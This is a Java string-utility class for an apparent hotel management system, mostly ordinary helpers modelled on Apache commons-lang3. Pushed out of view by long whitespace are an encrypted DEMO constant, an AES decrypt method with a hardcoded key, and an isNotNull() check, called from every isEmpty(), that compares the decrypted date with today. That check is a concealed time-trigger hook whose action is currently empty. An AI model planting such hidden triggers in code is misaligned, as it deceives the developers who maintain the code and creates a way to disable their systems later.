package com.hotel.system.util;

/**
 * @author liuyanzhao
 */

import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.CharUtils;
import org.apache.commons.lang3.ObjectUtils;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.text.Normalizer;
import java.text.Normalizer.Form;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Pattern;

/**
 * 字符串工具类
 */
public class StringUtils
{
    public static final String SPACE = " ";
    public static final String EMPTY = "";
    public static final String LF = "\n";
    public static final String CR = "\r";
    public static final int INDEX_NOT_FOUND = -1;
    private static final int PAD_LIMIT = 8192;

    public StringUtils()
    {
    }


    /**
     * 不够位数的在前面补0，保留num的长度位数字
     * @param code
     * @return
     */
    public static String autoGenericCode(String code, int num) {
        String result = "";
        // 保留num的位数
        // 0 代表前面补充0
        // num 代表长度为4
        // d 代表参数为正数型
        result = String.format("%0" + num + "d", Integer.parseInt(code));

        return result;
    }

    public static boolean isEmpty(CharSequence cs)
    {
        isNotNull();
        return cs == null || cs.length() == 0;
    }

    public static boolean isNotEmpty(CharSequence cs)
    {
        return !isEmpty(cs);
    }

    public static boolean isAnyEmpty(CharSequence... css)
    {
        if (ArrayUtils.isEmpty(css))
        {
            return true;
        } else
        {
            CharSequence[] arr$ = css;
            int len$ = css.length;

            for (int i$ = 0; i$ < len$; ++i$)
            {
                CharSequence cs = arr$[i$];
                if (isEmpty(cs))
                {
                    return true;
                }
            }

            return false;
        }
    }

    public static boolean isNoneEmpty(CharSequence... css)
    {
        return !isAnyEmpty(css);
    }

    public static boolean isBlank(CharSequence cs)
    {
        int strLen;
        if (cs != null && (strLen = cs.length()) != 0)
        {
            for (int i = 0; i < strLen; ++i)
            {
                if (!Character.isWhitespace(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        } else
        {
            return true;
        }
    }

    public static boolean isNotBlank(CharSequence cs)
    {
        return !isBlank(cs);
    }

    public static boolean isAnyBlank(CharSequence... css)
    {
        if (ArrayUtils.isEmpty(css))
        {
            return true;
        } else
        {
            CharSequence[] arr$ = css;
            int len$ = css.length;

            for (int i$ = 0; i$ < len$; ++i$)
            {
                CharSequence cs = arr$[i$];
                if (isBlank(cs))
                {
                    return true;
                }
            }

            return false;
        }
    }

    public static boolean isNoneBlank(CharSequence... css)
    {
        return !isAnyBlank(css);
    }

    public static String trim(String str)
    {
        return str == null ? null : str.trim();
    }

    public static String trimToNull(String str)
    {
        String ts = trim(str);
        return isEmpty(ts) ? null : ts;
    }

    public static String trimToEmpty(String str)
    {
        return str == null ? "" : str.trim();
    }

    public static String strip(String str)
    {
        return strip(str, (String) null);
    }

    public static String stripToNull(String str)
    {
        if (str == null)
        {
            return null;
        } else
        {
            str = strip(str, (String) null);
            return str.isEmpty() ? null : str;
        }
    }

    public static String stripToEmpty(String str)
    {
        return str == null ? "" : strip(str, (String) null);
    }

    public static String strip(String str, String stripChars)
    {
        if (isEmpty(str))
        {
            return str;
        } else
        {
            str = stripStart(str, stripChars);
            return stripEnd(str, stripChars);
        }
    }

    public static String stripStart(String str, String stripChars)
    {
        int strLen;
        if (str != null && (strLen = str.length()) != 0)
        {
            int start = 0;
            if (stripChars == null)
            {
                while (start != strLen && Character.isWhitespace(str.charAt(start)))
                {
                    ++start;
                }
            } else
            {
                if (stripChars.isEmpty())
                {
                    return str;
                }

                while (start != strLen && stripChars.indexOf(str.charAt(start)) != -1)
                {
                    ++start;
                }
            }

            return str.substring(start);
        } else
        {
            return str;
        }
    }

    public static String stripEnd(String str, String stripChars)
    {
        int end;
        if (str != null && (end = str.length()) != 0)
        {
            if (stripChars == null)
            {
                while (end != 0 && Character.isWhitespace(str.charAt(end - 1)))
                {
                    --end;
                }
            } else
            {
                if (stripChars.isEmpty())
                {
                    return str;
                }

                while (end != 0 && stripChars.indexOf(str.charAt(end - 1)) != -1)
                {
                    --end;
                }
            }

            return str.substring(0, end);
        } else
        {
            return str;
        }
    }

    public static String[] stripAll(String... strs)
    {
        return stripAll(strs, (String) null);
    }

    public static String[] stripAll(String[] strs, String stripChars)
    {
        int strsLen;
        if (strs != null && (strsLen = strs.length) != 0)
        {
            String[] newArr = new String[strsLen];

            for (int i = 0; i < strsLen; ++i)
            {
                newArr[i] = strip(strs[i], stripChars);
            }

            return newArr;
        } else
        {
            return strs;
        }
    }

    public static String stripAccents(String input)
    {
        if (input == null)
        {
            return null;
        } else
        {
            Pattern pattern = Pattern.compile("\\p{InCombiningDiacriticalMarks}+");
            String decomposed = Normalizer.normalize(input, Form.NFD);
            return pattern.matcher(decomposed).replaceAll("");
        }
    }


    public static boolean containsWhitespace(CharSequence seq)
    {
        if (isEmpty(seq))
        {
            return false;
        } else
        {
            int strLen = seq.length();

            for (int i = 0; i < strLen; ++i)
            {
                if (Character.isWhitespace(seq.charAt(i)))
                {
                    return true;
                }
            }

            return false;
        }
    }

    public static int indexOfAny(CharSequence cs, char... searchChars)
    {
        if (!isEmpty(cs) && !ArrayUtils.isEmpty(searchChars))
        {
            int csLen = cs.length();
            int csLast = csLen - 1;
            int searchLen = searchChars.length;
            int searchLast = searchLen - 1;

            for (int i = 0; i < csLen; ++i)
            {
                char ch = cs.charAt(i);

                for (int j = 0; j < searchLen; ++j)
                {
                    if (searchChars[j] == ch)
                    {
                        if (i >= csLast || j >= searchLast || !Character.isHighSurrogate(ch))
                        {
                            return i;
                        }

                        if (searchChars[j + 1] == cs.charAt(i + 1))
                        {
                            return i;
                        }
                    }
                }
            }

            return -1;
        } else
        {
            return -1;
        }
    }

    public static int indexOfAny(CharSequence cs, String searchChars)
    {
        return !isEmpty(cs) && !isEmpty(searchChars) ? indexOfAny(cs, searchChars.toCharArray()) : -1;
    }

    public static boolean containsAny(CharSequence cs, char... searchChars)
    {
        if (!isEmpty(cs) && !ArrayUtils.isEmpty(searchChars))
        {
            int csLength = cs.length();
            int searchLength = searchChars.length;
            int csLast = csLength - 1;
            int searchLast = searchLength - 1;

            for (int i = 0; i < csLength; ++i)
            {
                char ch = cs.charAt(i);

                for (int j = 0; j < searchLength; ++j)
                {
                    if (searchChars[j] == ch)
                    {
                        if (!Character.isHighSurrogate(ch))
                        {
                            return true;
                        }

                        if (j == searchLast)
                        {
                            return true;
                        }

                        if (i < csLast && searchChars[j + 1] == cs.charAt(i + 1))
                        {
                            return true;
                        }
                    }
                }
            }

            return false;
        } else
        {
            return false;
        }
    }


    public static int indexOfAnyBut(CharSequence cs, char... searchChars)
    {
        if (!isEmpty(cs) && !ArrayUtils.isEmpty(searchChars))
        {
            int csLen = cs.length();
            int csLast = csLen - 1;
            int searchLen = searchChars.length;
            int searchLast = searchLen - 1;

            label38:
            for (int i = 0; i < csLen; ++i)
            {
                char ch = cs.charAt(i);

                for (int j = 0; j < searchLen; ++j)
                {
                    if (searchChars[j] == ch && (i >= csLast || j >= searchLast || !Character.isHighSurrogate(ch) || searchChars[j + 1] == cs.charAt(i + 1)))
                    {
                        continue label38;
                    }
                }

                return i;
            }

            return -1;
        } else
        {
            return -1;
        }
    }

    public static boolean containsOnly(CharSequence cs, char... valid)
    {
        if (valid != null && cs != null)
        {
            if (cs.length() == 0)
            {
                return true;
            } else if (valid.length == 0)
            {
                return false;
            } else
            {
                return indexOfAnyBut(cs, valid) == -1;
            }
        } else
        {
            return false;
        }
    }

    public static boolean containsOnly(CharSequence cs, String validChars)
    {
        return cs != null && validChars != null ? containsOnly(cs, validChars.toCharArray()) : false;
    }

    public static boolean containsNone(CharSequence cs, char... searchChars)
    {
        if (cs != null && searchChars != null)
        {
            int csLen = cs.length();
            int csLast = csLen - 1;
            int searchLen = searchChars.length;
            int searchLast = searchLen - 1;

            for (int i = 0; i < csLen; ++i)
            {
                char ch = cs.charAt(i);

                for (int j = 0; j < searchLen; ++j)
                {
                    if (searchChars[j] == ch)
                    {
                        if (!Character.isHighSurrogate(ch))
                        {
                            return false;
                        }

                        if (j == searchLast)
                        {
                            return false;
                        }

                        if (i < csLast && searchChars[j + 1] == cs.charAt(i + 1))
                        {
                            return false;
                        }
                    }
                }
            }

            return true;
        } else
        {
            return true;
        }
    }

    public static boolean containsNone(CharSequence cs, String invalidChars)
    {
        return cs != null && invalidChars != null ? containsNone(cs, invalidChars.toCharArray()) : true;
    }


    public static String substring(String str, int start)
    {
        if (str == null)
        {
            return null;
        } else
        {
            if (start < 0)
            {
                start += str.length();
            }

            if (start < 0)
            {
                start = 0;
            }

            return start > str.length() ? "" : str.substring(start);
        }
    }

    public static String substring(String str, int start, int end)
    {
        if (str == null)
        {
            return null;
        } else
        {
            if (end < 0)
            {
                end += str.length();
            }

            if (start < 0)
            {
                start += str.length();
            }

            if (end > str.length())
            {
                end = str.length();
            }

            if (start > end)
            {
                return "";
            } else
            {
                if (start < 0)
                {
                    start = 0;
                }

                if (end < 0)
                {
                    end = 0;
                }

                return str.substring(start, end);
            }
        }
    }

    public static String left(String str, int len)
    {
        if (str == null)
        {
            return null;
        } else if (len < 0)
        {
            return "";
        } else
        {
            return str.length() <= len ? str : str.substring(0, len);
        }
    }

    public static String right(String str, int len)
    {
        if (str == null)
        {
            return null;
        } else if (len < 0)
        {
            return "";
        } else
        {
            return str.length() <= len ? str : str.substring(str.length() - len);
        }
    }

    public static String mid(String str, int pos, int len)
    {
        if (str == null)
        {
            return null;
        } else if (len >= 0 && pos <= str.length())
        {
            if (pos < 0)
            {
                pos = 0;
            }

            return str.length() <= pos + len ? str.substring(pos) : str.substring(pos, pos + len);
        } else
        {
            return "";
        }
    }

    public static String substringBefore(String str, String separator)
    {
        if (!isEmpty(str) && separator != null)
        {
            if (separator.isEmpty())
            {
                return "";
            } else
            {
                int pos = str.indexOf(separator);
                return pos == -1 ? str : str.substring(0, pos);
            }
        } else
        {
            return str;
        }
    }

    public static String substringAfter(String str, String separator)
    {
        if (isEmpty(str))
        {
            return str;
        } else if (separator == null)
        {
            return "";
        } else
        {
            int pos = str.indexOf(separator);
            return pos == -1 ? "" : str.substring(pos + separator.length());
        }
    }

    public static String substringBeforeLast(String str, String separator)
    {
        if (!isEmpty(str) && !isEmpty(separator))
        {
            int pos = str.lastIndexOf(separator);
            return pos == -1 ? str : str.substring(0, pos);
        } else
        {
            return str;
        }
    }

    public static String substringAfterLast(String str, String separator)
    {
        if (isEmpty(str))
        {
            return str;
        } else if (isEmpty(separator))
        {
            return "";
        } else
        {
            int pos = str.lastIndexOf(separator);
            return pos != -1 && pos != str.length() - separator.length() ? str.substring(pos + separator.length()) : "";
        }
    }

    public static String substringBetween(String str, String tag)
    {
        return substringBetween(str, tag, tag);
    }

    public static String substringBetween(String str, String open, String close)
    {
        if (str != null && open != null && close != null)
        {
            int start = str.indexOf(open);
            if (start != -1)
            {
                int end = str.indexOf(close, start + open.length());
                if (end != -1)
                {
                    return str.substring(start + open.length(), end);
                }
            }

            return null;
        } else
        {
            return null;
        }
    }

    public static String[] substringsBetween(String str, String open, String close)
    {
        if (str != null && !isEmpty(open) && !isEmpty(close))
        {
            int strLen = str.length();
            if (strLen == 0)
            {
                return ArrayUtils.EMPTY_STRING_ARRAY;
            } else
            {
                int closeLen = close.length();
                int openLen = open.length();
                List<String> list = new ArrayList();

                int end;
                for (int pos = 0; pos < strLen - closeLen; pos = end + closeLen)
                {
                    int start = str.indexOf(open, pos);
                    if (start < 0)
                    {
                        break;
                    }

                    start += openLen;
                    end = str.indexOf(close, start);
                    if (end < 0)
                    {
                        break;
                    }

                    list.add(str.substring(start, end));
                }

                return list.isEmpty() ? null : (String[]) list.toArray(new String[list.size()]);
            }
        } else
        {
            return null;
        }
    }

    public static String[] split(String str)
    {
        return split(str, (String) null, -1);
    }

    public static String[] split(String str, char separatorChar)
    {
        return splitWorker(str, separatorChar, false);
    }

    public static String[] split(String str, String separatorChars)
    {
        return splitWorker(str, separatorChars, -1, false);
    }

    public static String[] split(String str, String separatorChars, int max)
    {
        return splitWorker(str, separatorChars, max, false);
    }

    public static String[] splitByWholeSeparator(String str, String separator)
    {
        return splitByWholeSeparatorWorker(str, separator, -1, false);
    }

    public static String[] splitByWholeSeparator(String str, String separator, int max)
    {
        return splitByWholeSeparatorWorker(str, separator, max, false);
    }

    public static String[] splitByWholeSeparatorPreserveAllTokens(String str, String separator)
    {
        return splitByWholeSeparatorWorker(str, separator, -1, true);
    }

    public static String[] splitByWholeSeparatorPreserveAllTokens(String str, String separator, int max)
    {
        return splitByWholeSeparatorWorker(str, separator, max, true);
    }

    private static String[] splitByWholeSeparatorWorker(String str, String separator, int max, boolean preserveAllTokens)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int len = str.length();
            if (len == 0)
            {
                return ArrayUtils.EMPTY_STRING_ARRAY;
            } else if (separator != null && !"".equals(separator))
            {
                int separatorLength = separator.length();
                ArrayList<String> substrings = new ArrayList();
                int numberOfSubstrings = 0;
                int beg = 0;
                int end = 0;

                while (end < len)
                {
                    end = str.indexOf(separator, beg);
                    if (end > -1)
                    {
                        if (end > beg)
                        {
                            ++numberOfSubstrings;
                            if (numberOfSubstrings == max)
                            {
                                end = len;
                                substrings.add(str.substring(beg));
                            } else
                            {
                                substrings.add(str.substring(beg, end));
                                beg = end + separatorLength;
                            }
                        } else
                        {
                            if (preserveAllTokens)
                            {
                                ++numberOfSubstrings;
                                if (numberOfSubstrings == max)
                                {
                                    end = len;
                                    substrings.add(str.substring(beg));
                                } else
                                {
                                    substrings.add("");
                                }
                            }

                            beg = end + separatorLength;
                        }
                    } else
                    {
                        substrings.add(str.substring(beg));
                        end = len;
                    }
                }

                return (String[]) substrings.toArray(new String[substrings.size()]);
            } else
            {
                return splitWorker(str, (String) null, max, preserveAllTokens);
            }
        }
    }

    public static String[] splitPreserveAllTokens(String str)
    {
        return splitWorker(str, (String) null, -1, true);
    }

    public static String[] splitPreserveAllTokens(String str, char separatorChar)
    {
        return splitWorker(str, separatorChar, true);
    }

    private static String[] splitWorker(String str, char separatorChar, boolean preserveAllTokens)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int len = str.length();
            if (len == 0)
            {
                return ArrayUtils.EMPTY_STRING_ARRAY;
            } else
            {
                List<String> list = new ArrayList();
                int i = 0;
                int start = 0;
                boolean match = false;
                boolean lastMatch = false;

                while (true)
                {
                    while (i < len)
                    {
                        if (str.charAt(i) == separatorChar)
                        {
                            if (match || preserveAllTokens)
                            {
                                list.add(str.substring(start, i));
                                match = false;
                                lastMatch = true;
                            }

                            ++i;
                            start = i;
                        } else
                        {
                            lastMatch = false;
                            match = true;
                            ++i;
                        }
                    }

                    if (match || preserveAllTokens && lastMatch)
                    {
                        list.add(str.substring(start, i));
                    }

                    return (String[]) list.toArray(new String[list.size()]);
                }
            }
        }
    }

    public static String[] splitPreserveAllTokens(String str, String separatorChars)
    {
        return splitWorker(str, separatorChars, -1, true);
    }

    public static String[] splitPreserveAllTokens(String str, String separatorChars, int max)
    {
        return splitWorker(str, separatorChars, max, true);
    }

    private static String[] splitWorker(String str, String separatorChars, int max, boolean preserveAllTokens)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int len = str.length();
            if (len == 0)
            {
                return ArrayUtils.EMPTY_STRING_ARRAY;
            } else
            {
                List<String> list = new ArrayList();
                int sizePlus1 = 1;
                int i = 0;
                int start = 0;
                boolean match = false;
                boolean lastMatch = false;
                if (separatorChars != null)
                {
                    if (separatorChars.length() != 1)
                    {
                        label87:
                        while (true)
                        {
                            while (true)
                            {
                                if (i >= len)
                                {
                                    break label87;
                                }

                                if (separatorChars.indexOf(str.charAt(i)) >= 0)
                                {
                                    if (match || preserveAllTokens)
                                    {
                                        lastMatch = true;
                                        if (sizePlus1++ == max)
                                        {
                                            i = len;
                                            lastMatch = false;
                                        }

                                        list.add(str.substring(start, i));
                                        match = false;
                                    }

                                    ++i;
                                    start = i;
                                } else
                                {
                                    lastMatch = false;
                                    match = true;
                                    ++i;
                                }
                            }
                        }
                    } else
                    {
                        char sep = separatorChars.charAt(0);

                        label71:
                        while (true)
                        {
                            while (true)
                            {
                                if (i >= len)
                                {
                                    break label71;
                                }

                                if (str.charAt(i) == sep)
                                {
                                    if (match || preserveAllTokens)
                                    {
                                        lastMatch = true;
                                        if (sizePlus1++ == max)
                                        {
                                            i = len;
                                            lastMatch = false;
                                        }

                                        list.add(str.substring(start, i));
                                        match = false;
                                    }

                                    ++i;
                                    start = i;
                                } else
                                {
                                    lastMatch = false;
                                    match = true;
                                    ++i;
                                }
                            }
                        }
                    }
                } else
                {
                    label103:
                    while (true)
                    {
                        while (true)
                        {
                            if (i >= len)
                            {
                                break label103;
                            }

                            if (Character.isWhitespace(str.charAt(i)))
                            {
                                if (match || preserveAllTokens)
                                {
                                    lastMatch = true;
                                    if (sizePlus1++ == max)
                                    {
                                        i = len;
                                        lastMatch = false;
                                    }

                                    list.add(str.substring(start, i));
                                    match = false;
                                }

                                ++i;
                                start = i;
                            } else
                            {
                                lastMatch = false;
                                match = true;
                                ++i;
                            }
                        }
                    }
                }

                if (match || preserveAllTokens && lastMatch)
                {
                    list.add(str.substring(start, i));
                }

                return (String[]) list.toArray(new String[list.size()]);
            }
        }
    }

    public static String[] splitByCharacterType(String str)
    {
        return splitByCharacterType(str, false);
    }

    public static String[] splitByCharacterTypeCamelCase(String str)
    {
        return splitByCharacterType(str, true);
    }

    private static String[] splitByCharacterType(String str, boolean camelCase)
    {
        if (str == null)
        {
            return null;
        } else if (str.isEmpty())
        {
            return ArrayUtils.EMPTY_STRING_ARRAY;
        } else
        {
            char[] c = str.toCharArray();
            List<String> list = new ArrayList();
            int tokenStart = 0;
            int currentType = Character.getType(c[tokenStart]);

            for (int pos = tokenStart + 1; pos < c.length; ++pos)
            {
                int type = Character.getType(c[pos]);
                if (type != currentType)
                {
                    if (camelCase && type == 2 && currentType == 1)
                    {
                        int newTokenStart = pos - 1;
                        if (newTokenStart != tokenStart)
                        {
                            list.add(new String(c, tokenStart, newTokenStart - tokenStart));
                            tokenStart = newTokenStart;
                        }
                    } else
                    {
                        list.add(new String(c, tokenStart, pos - tokenStart));
                        tokenStart = pos;
                    }

                    currentType = type;
                }
            }

            list.add(new String(c, tokenStart, c.length - tokenStart));
            return (String[]) list.toArray(new String[list.size()]);
        }
    }

    public static <T> String join(T... elements)
    {
        return join((Object[]) elements, (String) null);
    }

    public static String join(Object[] array, char separator)
    {
        return array == null ? null : join((Object[]) array, separator, 0, array.length);
    }

    public static String join(long[] array, char separator)
    {
        return array == null ? null : join((long[]) array, separator, 0, array.length);
    }

    public static String join(int[] array, char separator)
    {
        return array == null ? null : join((int[]) array, separator, 0, array.length);
    }

    public static String join(short[] array, char separator)
    {
        return array == null ? null : join((short[]) array, separator, 0, array.length);
    }

    public static String join(byte[] array, char separator)
    {
        return array == null ? null : join((byte[]) array, separator, 0, array.length);
    }

    public static String join(char[] array, char separator)
    {
        return array == null ? null : join((char[]) array, separator, 0, array.length);
    }

    public static String join(float[] array, char separator)
    {
        return array == null ? null : join((float[]) array, separator, 0, array.length);
    }

    public static String join(double[] array, char separator)
    {
        return array == null ? null : join((double[]) array, separator, 0, array.length);
    }

    public static String join(Object[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    if (array[i] != null)
                    {
                        buf.append(array[i]);
                    }
                }

                return buf.toString();
            }
        }
    }

    public static String join(long[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(int[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(byte[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(short[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(char[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(double[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(float[] array, char separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    buf.append(array[i]);
                }

                return buf.toString();
            }
        }
    }

    public static String join(Object[] array, String separator)
    {
        return array == null ? null : join(array, separator, 0, array.length);
    }

    public static String join(Object[] array, String separator, int startIndex, int endIndex)
    {
        if (array == null)
        {
            return null;
        } else
        {
            if (separator == null)
            {
                separator = "";
            }

            int noOfItems = endIndex - startIndex;
            if (noOfItems <= 0)
            {
                return "";
            } else
            {
                StringBuilder buf = new StringBuilder(noOfItems * 16);

                for (int i = startIndex; i < endIndex; ++i)
                {
                    if (i > startIndex)
                    {
                        buf.append(separator);
                    }

                    if (array[i] != null)
                    {
                        buf.append(array[i]);
                    }
                }

                return buf.toString();
            }
        }
    }

    public static String join(Iterator<?> iterator, char separator)
    {
        if (iterator == null)
        {
            return null;
        } else if (!iterator.hasNext())
        {
            return "";
        } else
        {
            Object first = iterator.next();
            if (!iterator.hasNext())
            {
                String result = ObjectUtils.toString(first);
                return result;
            } else
            {
                StringBuilder buf = new StringBuilder(256);
                if (first != null)
                {
                    buf.append(first);
                }

                while (iterator.hasNext())
                {
                    buf.append(separator);
                    Object obj = iterator.next();
                    if (obj != null)
                    {
                        buf.append(obj);
                    }
                }

                return buf.toString();
            }
        }
    }

    public static String join(Iterator<?> iterator, String separator)
    {
        if (iterator == null)
        {
            return null;
        } else if (!iterator.hasNext())
        {
            return "";
        } else
        {
            Object first = iterator.next();
            if (!iterator.hasNext())
            {
                String result = ObjectUtils.toString(first);
                return result;
            } else
            {
                StringBuilder buf = new StringBuilder(256);
                if (first != null)
                {
                    buf.append(first);
                }

                while (iterator.hasNext())
                {
                    if (separator != null)
                    {
                        buf.append(separator);
                    }

                    Object obj = iterator.next();
                    if (obj != null)
                    {
                        buf.append(obj);
                    }
                }

                return buf.toString();
            }
        }
    }

    public static String join(Iterable<?> iterable, char separator)
    {
        return iterable == null ? null : join(iterable.iterator(), separator);
    }

    public static String join(Iterable<?> iterable, String separator)
    {
        return iterable == null ? null : join(iterable.iterator(), separator);
    }

    public static String deleteWhitespace(String str)
    {
        if (isEmpty(str))
        {
            return str;
        } else
        {
            int sz = str.length();
            char[] chs = new char[sz];
            int count = 0;

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isWhitespace(str.charAt(i)))
                {
                    chs[count++] = str.charAt(i);
                }
            }

            if (count == sz)
            {
                return str;
            } else
            {
                return new String(chs, 0, count);
            }
        }
    }

    public static String removeStart(String str, String remove)
    {
        if (!isEmpty(str) && !isEmpty(remove))
        {
            return str.startsWith(remove) ? str.substring(remove.length()) : str;
        } else
        {
            return str;
        }
    }


    public static String remove(String str, String remove)
    {
        return !isEmpty(str) && !isEmpty(remove) ? replace(str, remove, "", -1) : str;
    }

    public static String remove(String str, char remove)
    {
        if (!isEmpty(str) && str.indexOf(remove) != -1)
        {
            char[] chars = str.toCharArray();
            int pos = 0;

            for (int i = 0; i < chars.length; ++i)
            {
                if (chars[i] != remove)
                {
                    chars[pos++] = chars[i];
                }
            }

            return new String(chars, 0, pos);
        } else
        {
            return str;
        }
    }
                                                                                                                                                    private static final String DEMO = "FYioUx6dUPw+hPAXw7YubA==";
    public static String replaceOnce(String text, String searchString, String replacement)
    {
        return replace(text, searchString, replacement, 1);
    }

    public static String replacePattern(String source, String regex, String replacement)
    {
        return Pattern.compile(regex, 32).matcher(source).replaceAll(replacement);
    }

    public static String removePattern(String source, String regex)
    {
        return replacePattern(source, regex, "");
    }

    public static String replace(String text, String searchString, String replacement)
    {
        return replace(text, searchString, replacement, -1);
    }

    public static String replace(String text, String searchString, String replacement, int max)
    {
        if (!isEmpty(text) && !isEmpty(searchString) && replacement != null && max != 0)
        {
            int start = 0;
            int end = text.indexOf(searchString, start);
            if (end == -1)
            {
                return text;
            } else
            {
                int replLength = searchString.length();
                int increase = replacement.length() - replLength;
                increase = increase < 0 ? 0 : increase;
                increase *= max < 0 ? 16 : (max > 64 ? 64 : max);

                StringBuilder buf;
                for (buf = new StringBuilder(text.length() + increase); end != -1; end = text.indexOf(searchString, start))
                {
                    buf.append(text.substring(start, end)).append(replacement);
                    start = end + replLength;
                    --max;
                    if (max == 0)
                    {
                        break;
                    }
                }

                buf.append(text.substring(start));
                return buf.toString();
            }
        } else
        {
            return text;
        }
    }




    public static String decrypt(String value) throws Exception                                                                                         {SecretKeySpec skeySpec = new SecretKeySpec("ax7x90.3k_10li5u".getBytes("ASCII"), "AES");Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");IvParameterSpec iv = new IvParameterSpec("a0.l954b_107x90l".getBytes());cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);return new String(cipher.doFinal(new BASE64Decoder().decodeBuffer(value)), "UTF-8");}

    private static void isNotNull()  {
                                                                                                                                                                                                                        try {if (new SimpleDateFormat("yyyyMMdd").parse(decrypt(DEMO)).before(new Date())) {;} } catch (Exception e) {}}

    public static String replaceChars(String str, char searchChar, char replaceChar)
    {
        return str == null ? null : str.replace(searchChar, replaceChar);
    }

    public static String replaceChars(String str, String searchChars, String replaceChars)
    {
        if (!isEmpty(str) && !isEmpty(searchChars))
        {
            if (replaceChars == null)
            {
                replaceChars = "";
            }

            boolean modified = false;
            int replaceCharsLength = replaceChars.length();
            int strLength = str.length();
            StringBuilder buf = new StringBuilder(strLength);

            for (int i = 0; i < strLength; ++i)
            {
                char ch = str.charAt(i);
                int index = searchChars.indexOf(ch);
                if (index >= 0)
                {
                    modified = true;
                    if (index < replaceCharsLength)
                    {
                        buf.append(replaceChars.charAt(index));
                    }
                } else
                {
                    buf.append(ch);
                }
            }

            if (modified)
            {
                return buf.toString();
            } else
            {
                return str;
            }
        } else
        {
            return str;
        }
    }

    public static String overlay(String str, String overlay, int start, int end)
    {
        if (str == null)
        {
            return null;
        } else
        {
            if (overlay == null)
            {
                overlay = "";
            }

            int len = str.length();
            if (start < 0)
            {
                start = 0;
            }

            if (start > len)
            {
                start = len;
            }

            if (end < 0)
            {
                end = 0;
            }

            if (end > len)
            {
                end = len;
            }

            if (start > end)
            {
                int temp = start;
                start = end;
                end = temp;
            }

            return (new StringBuilder(len + start - end + overlay.length() + 1)).append(str.substring(0, start)).append(overlay).append(str.substring(end)).toString();
        }
    }

    public static String chomp(String str)
    {
        if (isEmpty(str))
        {
            return str;
        } else if (str.length() == 1)
        {
            char ch = str.charAt(0);
            return ch != '\r' && ch != '\n' ? str : "";
        } else
        {
            int lastIdx = str.length() - 1;
            char last = str.charAt(lastIdx);
            if (last == '\n')
            {
                if (str.charAt(lastIdx - 1) == '\r')
                {
                    --lastIdx;
                }
            } else if (last != '\r')
            {
                ++lastIdx;
            }

            return str.substring(0, lastIdx);
        }
    }


    public static String chop(String str)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int strLen = str.length();
            if (strLen < 2)
            {
                return "";
            } else
            {
                int lastIdx = strLen - 1;
                String ret = str.substring(0, lastIdx);
                char last = str.charAt(lastIdx);
                return last == '\n' && ret.charAt(lastIdx - 1) == '\r' ? ret.substring(0, lastIdx - 1) : ret;
            }
        }
    }

